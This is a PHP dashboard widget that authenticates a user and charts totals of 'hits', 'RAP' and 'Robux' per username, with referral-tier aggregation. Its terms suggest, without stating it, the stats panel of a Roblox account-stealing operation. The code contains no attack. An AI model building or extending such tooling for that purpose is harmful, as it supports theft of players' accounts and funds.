<?php
/* ---- functions this file uses (formerly from libs/functions.php, which is no longer needed) ---- */
if (!function_exists('executeSafeQuery')) {
function executeSafeQuery($sql, $params = []) {
    static $db = null;   // one database connection for the whole page (was: a new one for every query)
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
    // Block suspicious keywords (customize based on your needs)
$blockedKeywords = ['DROP TABLE', 'DELETE FROM', 'TRUNCATE TABLE', 'GRANT ', 'ALTER TABLE', 'CREATE TABLE', 'CREATE DATABASE'];
	foreach ($blockedKeywords as $keyword) {
        if (stripos($sql, $keyword) !== false) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $db->prepare($sql);
        
        // Bind parameters securely
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, 
                is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        return [];
    }
}
}
/* ---- end of the functions from libs/functions.php ---- */
if (!function_exists('ultimaAuthenticatedRegular')) {
    function ultimaAuthenticatedRegular()
    {
        static $authenticatedUser = null;
        if (is_array($authenticatedUser)) {
            return $authenticatedUser;
        }
        if (session_status() !== PHP_SESSION_ACTIVE) {
            session_name('token');
            if (!session_start()) {
                return null;
            }
        }
        if (session_name() !== 'token' || !function_exists('executeSafeQuery')) {
            return null;
        }
        $authCode = trim((string)($_SESSION['auth_code'] ?? ''));
        if ($authCode === '') {
            return null;
        }
        try {
            $rows = executeSafeQuery(
                'SELECT * FROM regular WHERE auth_code = :auth_code LIMIT 2',
                [':auth_code' => $authCode]
            );
        } catch (\Throwable $e) {
            return null;
        }
        if (!is_array($rows) || count($rows) !== 1 || !is_array($rows[0])) {
            return null;
        }
        $row = $rows[0];
        $storedAuthCode = (string)($row['auth_code'] ?? '');
        $resolvedLinkId = (int)($row['link_id'] ?? 0);
        if ($storedAuthCode === '' || !hash_equals($storedAuthCode, $authCode) || $resolvedLinkId <= 0) {
            return null;
        }
        $authenticatedUser = $row;
        return $authenticatedUser;
    }
}

if (empty($userData) || !is_array($userData) || (int)($userData['link_id'] ?? 0) <= 0) {
    $userData = function_exists('ultimaAuthenticatedRegular') ? ultimaAuthenticatedRegular() : null;
}
if (!is_array($userData)) {
    http_response_code(401);
    exit;
}
if (!function_exists('dashWidgetQuery')) {
    function dashWidgetQuery($sql, $params = [], $ttl = 60) {
        if (function_exists('ultimaPageQuery')) {
            return ultimaPageQuery($sql, $params, $ttl);
        }
        if (function_exists('executeSafeQuery')) {
            return executeSafeQuery($sql, $params);
        }
        return [];
    }
}


$link_id = (int)$userData['link_id'];
$linkId = $link_id;
$isTriplehook = (int)($userData['triplehook'] ?? 0) === 1;

if($isTriplehook){
    $totalQuery = "SELECT 
        COALESCE(SUM(summary), 0) as total_summary,
        COALESCE(SUM(rap), 0) as total_rap,
        COALESCE(SUM(robux), 0) as total_robux
        FROM hits WHERE link_id IN (SELECT r.link_id FROM regular r WHERE r.referred_by = :link_id)
        AND id IN (SELECT MIN(h2.id) FROM hits h2 WHERE h2.link_id IN (SELECT r2.link_id FROM regular r2 WHERE r2.referred_by = :link_id2) GROUP BY h2.username, DATE(h2.created_at))";
    $totalResult = dashWidgetQuery($totalQuery, [':link_id' => $link_id, ':link_id2' => $link_id]);

    $todayQuery = "SELECT 
        COALESCE(SUM(summary), 0) as today_summary,
        COALESCE(SUM(rap), 0) as today_rap,
        COALESCE(SUM(robux), 0) as today_robux
        FROM hits WHERE link_id IN (SELECT r.link_id FROM regular r WHERE r.referred_by = :link_id) AND DATE(created_at) = CURDATE()
        AND id IN (SELECT MIN(h2.id) FROM hits h2 WHERE h2.link_id IN (SELECT r2.link_id FROM regular r2 WHERE r2.referred_by = :link_id2) AND DATE(h2.created_at) = CURDATE() GROUP BY h2.username)";
    $todayResult = dashWidgetQuery($todayQuery, [':link_id' => $link_id, ':link_id2' => $link_id]);

    $monthlyQuery = "SELECT 
        DATE_FORMAT(created_at, '%Y-%m') as month,
        COALESCE(SUM(summary), 0) as monthly_summary,
        COALESCE(SUM(rap), 0) as monthly_rap,
        COALESCE(SUM(robux), 0) as monthly_balance
        FROM hits 
        WHERE link_id IN (SELECT r.link_id FROM regular r WHERE r.referred_by = :link_id) 
        AND created_at >= '2026-01-01' AND created_at < '2027-01-01'
        AND id IN (SELECT MIN(h2.id) FROM hits h2 WHERE h2.link_id IN (SELECT r2.link_id FROM regular r2 WHERE r2.referred_by = :link_id2) AND h2.created_at >= '2026-01-01' AND h2.created_at < '2027-01-01' GROUP BY h2.username, DATE(h2.created_at))
        GROUP BY DATE_FORMAT(created_at, '%Y-%m')
        ORDER BY month ASC";
    $monthlyResult = dashWidgetQuery($monthlyQuery, [':link_id' => $link_id, ':link_id2' => $link_id]);

    $weeklyQuery = "SELECT DATE(created_at) as day, COALESCE(SUM(summary),0) as ws, COALESCE(SUM(rap),0) as wr, COALESCE(SUM(robux),0) as wb FROM hits WHERE link_id IN (SELECT r.link_id FROM regular r WHERE r.referred_by = :link_id) AND created_at >= DATE_SUB(CURDATE(), INTERVAL (WEEKDAY(CURDATE())) DAY) AND id IN (SELECT MIN(h2.id) FROM hits h2 WHERE h2.link_id IN (SELECT r2.link_id FROM regular r2 WHERE r2.referred_by = :link_id2) AND h2.created_at >= DATE_SUB(CURDATE(), INTERVAL (WEEKDAY(CURDATE())) DAY) GROUP BY h2.username, DATE(h2.created_at)) GROUP BY DATE(created_at) ORDER BY day ASC";
    $weeklyResult = dashWidgetQuery($weeklyQuery, [':link_id' => $link_id, ':link_id2' => $link_id]);
}else{
    $totalQuery = "SELECT 
        COALESCE(SUM(summary), 0) as total_summary,
        COALESCE(SUM(rap), 0) as total_rap,
        COALESCE(SUM(robux), 0) as total_robux
        FROM hits WHERE link_id = :link_id
        AND id IN (SELECT MIN(h2.id) FROM hits h2 WHERE h2.link_id = :link_id2 GROUP BY h2.username, DATE(h2.created_at))";
    $totalResult = dashWidgetQuery($totalQuery, [':link_id' => $link_id, ':link_id2' => $link_id]);

    $todayQuery = "SELECT 
        COALESCE(SUM(summary), 0) as today_summary,
        COALESCE(SUM(rap), 0) as today_rap,
        COALESCE(SUM(robux), 0) as today_robux
        FROM hits WHERE link_id = :link_id AND DATE(created_at) = CURDATE()
        AND id IN (SELECT MIN(h2.id) FROM hits h2 WHERE h2.link_id = :link_id2 AND DATE(h2.created_at) = CURDATE() GROUP BY h2.username)";
    $todayResult = dashWidgetQuery($todayQuery, [':link_id' => $link_id, ':link_id2' => $link_id]);

    $monthlyQuery = "SELECT 
        DATE_FORMAT(created_at, '%Y-%m') as month,
        COALESCE(SUM(summary), 0) as monthly_summary,
        COALESCE(SUM(rap), 0) as monthly_rap,
        COALESCE(SUM(robux), 0) as monthly_balance
        FROM hits 
        WHERE link_id = :link_id 
        AND created_at >= '2026-01-01' AND created_at < '2027-01-01'
        AND id IN (SELECT MIN(h2.id) FROM hits h2 WHERE h2.link_id = :link_id2 AND h2.created_at >= '2026-01-01' AND h2.created_at < '2027-01-01' GROUP BY h2.username, DATE(h2.created_at))
        GROUP BY DATE_FORMAT(created_at, '%Y-%m')
        ORDER BY month ASC";
    $monthlyResult = dashWidgetQuery($monthlyQuery, [':link_id' => $link_id, ':link_id2' => $link_id]);

    $weeklyQuery = "SELECT DATE(created_at) as day, COALESCE(SUM(summary),0) as ws, COALESCE(SUM(rap),0) as wr, COALESCE(SUM(robux),0) as wb FROM hits WHERE link_id = :link_id AND created_at >= DATE_SUB(CURDATE(), INTERVAL (WEEKDAY(CURDATE())) DAY) AND id IN (SELECT MIN(h2.id) FROM hits h2 WHERE h2.link_id = :link_id2 AND h2.created_at >= DATE_SUB(CURDATE(), INTERVAL (WEEKDAY(CURDATE())) DAY) GROUP BY h2.username, DATE(h2.created_at)) GROUP BY DATE(created_at) ORDER BY day ASC";
    $weeklyResult = dashWidgetQuery($weeklyQuery, [':link_id' => $link_id, ':link_id2' => $link_id]);
}

$totalSummary = $totalResult[0]['total_summary'] ?? 0;
$totalRap = $totalResult[0]['total_rap'] ?? 0;
$totalRobux = $totalResult[0]['total_robux'] ?? 0;

$todaySummary = $todayResult[0]['today_summary'] ?? 0;
$todayRap = $todayResult[0]['today_rap'] ?? 0;
$todayRobux = $todayResult[0]['today_robux'] ?? 0;

$monthlyData = [];
$monthlyRapData = [];
$monthlyBalanceData = [];
for ($i = 1; $i <= 12; $i++) {
    $monthKey = '2026-' . str_pad($i, 2, '0', STR_PAD_LEFT);
    $monthlyData[$monthKey] = 0;
    $monthlyRapData[$monthKey] = 0;
    $monthlyBalanceData[$monthKey] = 0;
}

if (!empty($monthlyResult)) {
    foreach ($monthlyResult as $row) {
        if (isset($monthlyData[$row['month']])) {
            $monthlyData[$row['month']] = (int)$row['monthly_summary'];
            $monthlyRapData[$row['month']] = (int)$row['monthly_rap'];
            $monthlyBalanceData[$row['month']] = (int)$row['monthly_balance'];
        }
    }
}

$chartData = array_values($monthlyData);
$chartRapData = array_values($monthlyRapData);
$chartBalanceData = array_values($monthlyBalanceData);
$chartDataJson = json_encode($chartData);
$chartRapDataJson = json_encode($chartRapData);
$chartBalanceDataJson = json_encode($chartBalanceData);

$weekStart = date('Y-m-d', strtotime('monday this week'));
$weeklySummary = [];$weeklyRap = [];$weeklyBalance = [];
for($i=0;$i<7;$i++){$d=date('Y-m-d',strtotime($weekStart." +{$i} days"));$weeklySummary[$d]=0;$weeklyRap[$d]=0;$weeklyBalance[$d]=0;}
if(!empty($weeklyResult)){foreach($weeklyResult as $row){$d=$row['day'];if(isset($weeklySummary[$d])){$weeklySummary[$d]=(int)$row['ws'];$weeklyRap[$d]=(int)$row['wr'];$weeklyBalance[$d]=(int)$row['wb'];}}}
$wSummaryJson=json_encode(array_values($weeklySummary));
$wRapJson=json_encode(array_values($weeklyRap));
$wBalanceJson=json_encode(array_values($weeklyBalance));
$wLabelsJson=json_encode(array_map(function($d){return date('D',strtotime($d));},array_keys($weeklySummary)));

function formatValue($val) {
    return number_format($val, 0, '.', ' ');
}

$todaySummaryText = $todaySummary > 0 ? "+".formatValue($todaySummary) : "+0";
$todayRapText = $todayRap > 0 ? "+".formatValue($todayRap) : "+0";
$todayRobuxText = $todayRobux > 0 ? "+".formatValue($todayRobux)." R$" : "+0 R$";
?>
<style>
.summary-card-container{position:relative;overflow:visible;cursor:default}
.summary-content{position:relative;z-index:1;width:100%}
.summary-grid-horizontal{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;text-align:left;width:100%}
.summary-item{display:flex;flex-direction:column;gap:2px;animation:cardFadeUp .6s cubic-bezier(.16,1,.3,1) both;padding-left:20px;border-left:1px solid rgba(255,255,255,0.06)}
.summary-item:first-child{padding-left:0;border-left:none}
.summary-item:nth-child(1){animation-delay:.05s}
.summary-item:nth-child(2){animation-delay:.1s}
.summary-item:nth-child(3){animation-delay:.15s}
.summary-label{font-family:'Rajdhani',sans-serif;font-size:0.72rem;font-weight:600;color:rgba(190,190,190,0.9);letter-spacing:.5px;text-transform:uppercase;margin-bottom:4px}
.summary-value{font-family:'Rajdhani',sans-serif;font-size:1.35rem;font-weight:700;color:rgba(255,255,255,0.95);line-height:1;margin-bottom:6px;text-shadow:0 0 20px rgba(255,255,255,0.08)}
.summary-bottom-row{display:flex;align-items:center;gap:6px;margin-bottom:6px}
.summary-change{font-family:'Rajdhani',sans-serif;font-size:0.72rem;font-weight:600;color:rgba(74,222,128,0.85);display:inline-flex;align-items:center;gap:4px}
.summary-change span{color:rgba(255,255,255,0.25);font-weight:400}
.summary-mini-chart{display:flex;align-items:flex-end;gap:2px;height:28px;position:relative;cursor:pointer}
.summary-mini-bar{flex:1;min-width:0;border-radius:2px 2px 0 0;transition:all 0.4s cubic-bezier(.16,1,.3,1);position:relative;min-height:2px;transform-origin:bottom}
@keyframes sMiniGrow{from{opacity:0;transform:scaleY(0)}to{opacity:1;transform:scaleY(1)}}
.summary-mini-bar{animation:sMiniGrow 0.6s cubic-bezier(.16,1,.3,1) both}
.summary-mini-bar:nth-child(1){animation-delay:0.1s}
.summary-mini-bar:nth-child(2){animation-delay:0.15s}
.summary-mini-bar:nth-child(3){animation-delay:0.2s}
.summary-mini-bar:nth-child(4){animation-delay:0.25s}
.summary-mini-bar:nth-child(5){animation-delay:0.3s}
.summary-mini-bar:nth-child(6){animation-delay:0.35s}
.summary-mini-bar:nth-child(7){animation-delay:0.4s}
.summary-mini-bar.clr-summary{background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.06);border-bottom:none}
.summary-mini-bar.clr-summary:hover{background:rgba(255,255,255,0.18);box-shadow:0 -3px 10px -2px rgba(255,255,255,0.08);transform:scaleY(1.12)}
.summary-mini-bar.clr-summary.zero{background:rgba(255,255,255,0.03);border-color:rgba(255,255,255,0.03)}
.summary-mini-bar.clr-rap{background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.06);border-bottom:none}
.summary-mini-bar.clr-rap:hover{background:rgba(255,255,255,0.18);box-shadow:0 -3px 10px -2px rgba(255,255,255,0.08);transform:scaleY(1.12)}
.summary-mini-bar.clr-rap.zero{background:rgba(255,255,255,0.03);border-color:rgba(255,255,255,0.03)}
.summary-mini-bar.clr-balance{background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.06);border-bottom:none}
.summary-mini-bar.clr-balance:hover{background:rgba(255,255,255,0.18);box-shadow:0 -3px 10px -2px rgba(255,255,255,0.08);transform:scaleY(1.12)}
.summary-mini-bar.clr-balance.zero{background:rgba(255,255,255,0.03);border-color:rgba(255,255,255,0.03)}
.summary-mini-info{display:flex;align-items:center;justify-content:space-between;margin-top:3px}
.summary-mini-labels{display:flex;gap:1px;flex:1}
.summary-mini-label{font-family:'Rajdhani',sans-serif;font-size:0.45rem;color:rgba(255,255,255,0.25);flex:1;text-align:center;min-width:0}
.summary-mini-pct{font-family:'Rajdhani',sans-serif;font-size:0.6rem;font-weight:600;display:flex;align-items:center;gap:2px;white-space:nowrap}
.summary-mini-pct i{font-size:0.45rem}
@media(max-width:768px){
    .summary-grid-horizontal{gap:12px}
    .summary-item{padding-left:12px}
    .summary-label{font-size:0.65rem}
    .summary-value{font-size:1.15rem}
    .summary-change{font-size:0.65rem}
    .summary-mini-chart{height:24px}
}
@media(max-width:480px){
    .summary-grid-horizontal{gap:8px}
    .summary-item{padding-left:8px}
    .summary-value{font-size:1rem}
    .summary-label{font-size:0.6rem}
    .summary-change{font-size:0.6rem}
    .summary-mini-chart{height:20px;gap:1px}
    .summary-mini-label{font-size:0.4rem}
}
</style>
<div class="modern-stat-card summary-card-container" data-color="gold" id="summary-card">
    <div class="neon-border-el"></div>
    <div class="summary-content">
        <div class="summary-grid-horizontal">
            <div class="summary-item">
                <div class="summary-label">Summary Total</div>
                <div class="summary-value summary-counter" data-target="<?= $totalSummary ?>">0</div>
                <div class="summary-bottom-row">
                    <div class="summary-change"><?= $todaySummaryText ?> <span>today</span></div>
                </div>
                <div class="summary-mini-chart" id="sMiniSummary"></div>
                <div class="summary-mini-info"><div class="summary-mini-labels" id="sMiniSummaryL"></div><div class="summary-mini-pct" id="sMiniSummaryP"></div></div>
            </div>
            <div class="summary-item">
                <div class="summary-label">RAP Total</div>
                <div class="summary-value summary-counter" data-target="<?= $totalRap ?>">0</div>
                <div class="summary-bottom-row">
                    <div class="summary-change"><?= $todayRapText ?> <span>today</span></div>
                </div>
                <div class="summary-mini-chart" id="sMiniRap"></div>
                <div class="summary-mini-info"><div class="summary-mini-labels" id="sMiniRapL"></div><div class="summary-mini-pct" id="sMiniRapP"></div></div>
            </div>
            <div class="summary-item">
                <div class="summary-label">Balance Total</div>
                <div class="summary-value" id="balance-value" data-target="<?= $totalRobux ?>">0 R$</div>
                <div class="summary-bottom-row">
                    <div class="summary-change"><?= $todayRobuxText ?> <span>today</span></div>
                </div>
                <div class="summary-mini-chart" id="sMiniBalance"></div>
                <div class="summary-mini-info"><div class="summary-mini-labels" id="sMiniBalanceL"></div><div class="summary-mini-pct" id="sMiniBalanceP"></div></div>
            </div>
        </div>
    </div>
</div>
<script>
(function(){
    function formatNumber(n){return Math.floor(n).toString().replace(/\B(?=(\d{3})+(?!\d))/g,' ');}

    function buildSummaryMini(cId,lId,pId,data,labels,clr,tipLabel){
        var c=document.getElementById(cId),l=document.getElementById(lId),p=document.getElementById(pId);
        if(!c)return;var mx=Math.max.apply(null,data)||1;
        var today=data[data.length-1]||0,yest=data[data.length-2]||0;
        var pct=yest>0?Math.round(((today-yest)/yest)*100):today>0?100:0;
        var bars=c.querySelectorAll('.summary-mini-bar');
        var reuse=bars.length===data.length;
        if(!reuse){c.innerHTML='';bars=[];}
        var labelNodes=l?l.querySelectorAll('.summary-mini-label'):[];
        if(l&&labelNodes.length!==data.length){l.innerHTML='';labelNodes=[];}
        for(var i=0;i<data.length;i++){
            var h=data[i]>0?Math.max(((data[i]/mx)*100),8):8;
            var bar=bars[i];
            if(!bar){bar=document.createElement('div');c.appendChild(bar);}
            bar.className='summary-mini-bar clr-'+clr+(data[i]===0?' zero':'');
            bar.style.height=h+'%';bar.setAttribute('data-val',data[i]);bar.setAttribute('data-label',labels[i]||'');bar.setAttribute('data-tl',tipLabel);bar.setAttribute('data-clr',clr);
            if(l){
                var lb=labelNodes[i];
                if(!lb){lb=document.createElement('div');lb.className='summary-mini-label';l.appendChild(lb);}
                lb.textContent=labels[i]||'';
            }
        }
        if(p){
            var arrow=pct>=0?'<i class="fas fa-arrow-up"></i>':'<i class="fas fa-arrow-down"></i>';
            p.innerHTML=arrow+' '+Math.abs(pct)+'%';
            p.style.color=pct>=0?'rgba(74,222,128,0.6)':'rgba(248,113,113,0.6)';
        }
        if(c.dataset.liveSummaryTooltipBound)return;
        c.dataset.liveSummaryTooltipBound='1';
        var dotColors={summary:'rgba(255,255,255,0.5)',rap:'rgba(255,255,255,0.5)',balance:'rgba(255,255,255,0.5)'};
        var sTipX=0,sTipY=0,sTipTX=0,sTipTY=0,sTipRaf=null,sTipActive=false;
        function sTipLerp(){
            sTipX+=(sTipTX-sTipX)*0.15;sTipY+=(sTipTY-sTipY)*0.15;
            var tt=document.querySelector('.stat-tooltip');if(!tt)return;
            tt.style.left=Math.round(sTipX)+'px';tt.style.top=Math.round(sTipY)+'px';
            if(Math.abs(sTipTX-sTipX)>0.5||Math.abs(sTipTY-sTipY)>0.5){sTipRaf=requestAnimationFrame(sTipLerp);}
            else{tt.style.left=sTipTX+'px';tt.style.top=sTipTY+'px';sTipRaf=null;}
        }
        function sMoveTip(x,y){sTipTX=x;sTipTY=y;if(!sTipRaf)sTipRaf=requestAnimationFrame(sTipLerp);}

        c.addEventListener('mousemove',function(e){
            var tt=document.querySelector('.stat-tooltip');if(!tt)return;
            var bars=c.querySelectorAll('.summary-mini-bar');var hit=null;
            for(var j=0;j<bars.length;j++){var br=bars[j].getBoundingClientRect();if(e.clientX>=br.left&&e.clientX<=br.right){hit=bars[j];break;}}
            if(!hit){return;}
            var val=hit.getAttribute('data-val'),lbl=hit.getAttribute('data-label'),tlbl=hit.getAttribute('data-tl'),dc=hit.getAttribute('data-clr');
            tt.innerHTML='<div class="stat-tooltip-title">'+lbl+'</div><div class="stat-tooltip-row"><span class="stat-tooltip-dot" style="background:'+(dotColors[dc]||dotColors.summary)+'"></span><span class="stat-tooltip-label">'+tlbl+':</span><span class="stat-tooltip-value">'+val+'</span></div>';
            var r=hit.getBoundingClientRect();
            var tx=r.left+r.width/2-50,ty=r.top-65;
            if(tx<8)tx=8;if(tx+120>window.innerWidth)tx=window.innerWidth-128;if(ty<8)ty=r.bottom+10;
            if(!sTipActive){sTipX=tx;sTipY=ty;tt.style.left=tx+'px';tt.style.top=ty+'px';sTipActive=true;}
            else{sMoveTip(tx,ty);}
            tt.classList.add('visible');
        });
        c.addEventListener('mouseleave',function(){
            var tt=document.querySelector('.stat-tooltip');if(tt)tt.classList.remove('visible');
            sTipActive=false;if(sTipRaf){cancelAnimationFrame(sTipRaf);sTipRaf=null;}
        });
    }

    var wLabels=<?=$wLabelsJson?>;
    buildSummaryMini('sMiniSummary','sMiniSummaryL','sMiniSummaryP',<?=$wSummaryJson?>,wLabels,'summary','Summary');
    buildSummaryMini('sMiniRap','sMiniRapL','sMiniRapP',<?=$wRapJson?>,wLabels,'rap','RAP');
    buildSummaryMini('sMiniBalance','sMiniBalanceL','sMiniBalanceP',<?=$wBalanceJson?>,wLabels,'balance','Balance');

    document.querySelectorAll('.summary-counter').forEach(function(counter){
        var target=parseInt(counter.getAttribute('data-target'))||0;
        if(target===0)return;
        var duration=1000,steps=Math.min(target,60),stepDuration=duration/steps,increment=target/steps,current=0;
        var timer=setInterval(function(){current+=increment;if(current>=target){counter.textContent=formatNumber(target);clearInterval(timer);}else{counter.textContent=formatNumber(Math.floor(current));}},stepDuration);
    });

    var balanceEl=document.getElementById('balance-value');
    if(balanceEl){
        var target=parseInt(balanceEl.getAttribute('data-target'))||0;
        if(target===0){
            balanceEl.textContent='0 R$';
        }else{
            var duration=1000,steps=Math.min(target,60),stepDuration=duration/steps,increment=target/steps,current=0;
            var timer=setInterval(function(){current+=increment;if(current>=target){balanceEl.textContent=formatNumber(target)+' R$';clearInterval(timer);}else{balanceEl.textContent=formatNumber(Math.floor(current))+' R$';}},stepDuration);
        }
    }

    window.updateSummaryLive=function(payload,animate){
        if(!payload)return;
        var card=document.getElementById('summary-card');
        if(!card)return;
        var totals=payload.totals||{},today=payload.today||{},weekly=payload.weekly||{};
        var items=card.querySelectorAll('.summary-item');
        var keys=['summary','rap','balance'];
        for(var i=0;i<keys.length;i++){
            var key=keys[i],item=items[i];
            if(!item)continue;
            var value=parseInt(totals[key])||0;
            var valueEl=item.querySelector('.summary-value');
            if(valueEl){
                valueEl.setAttribute('data-target',value);
                if(typeof window.dashboardAnimateNumber==='function')window.dashboardAnimateNumber(valueEl,value,key==='balance'?' R$':'',animate);
                else valueEl.textContent=key==='balance'?formatNumber(value)+' R$':formatNumber(value);
            }
            var changeEl=item.querySelector('.summary-change');
            if(changeEl){
                var todayValue=parseInt(today[key])||0;
                changeEl.innerHTML='+'+formatNumber(todayValue)+(key==='balance'?' R$':'')+' <span>today</span>';
            }
        }
        var labels=Array.isArray(payload.labels)?payload.labels:wLabels;
        buildSummaryMini('sMiniSummary','sMiniSummaryL','sMiniSummaryP',weekly.summary||[],labels,'summary','Summary');
        buildSummaryMini('sMiniRap','sMiniRapL','sMiniRapP',weekly.rap||[],labels,'rap','RAP');
        buildSummaryMini('sMiniBalance','sMiniBalanceL','sMiniBalanceP',weekly.balance||[],labels,'balance','Balance');
    };
})();
</script>
